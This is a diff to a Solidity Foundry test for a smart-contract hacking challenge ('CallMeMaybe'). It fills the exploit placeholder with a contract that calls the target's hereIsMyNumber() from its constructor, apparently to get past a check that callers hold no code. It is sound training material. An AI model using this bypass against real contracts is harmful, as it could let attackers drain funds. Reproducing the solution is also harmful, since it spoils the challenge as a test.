@@ -5,9 +5,14 @@ import "./BaseTest.t.sol";
 import "src/05_CallMeMaybe/CallMeMaybe.sol";
 
 // forge test --match-contract CallMeMaybeTest -vvvv
+contract CRJ {
+    constructor(address target) payable {
+        CallMeMaybe(payable(target)).hereIsMyNumber();
+    }
+}
 contract CallMeMaybeTest is BaseTest {
     CallMeMaybe instance;
-
+    CRJ carly;
     function setUp() public override {
         super.setUp();
         payable(user1).transfer(0.01 ether);
@@ -15,8 +20,7 @@ contract CallMeMaybeTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        carly = new CRJ(address(instance));
         checkSuccess();
     }
 
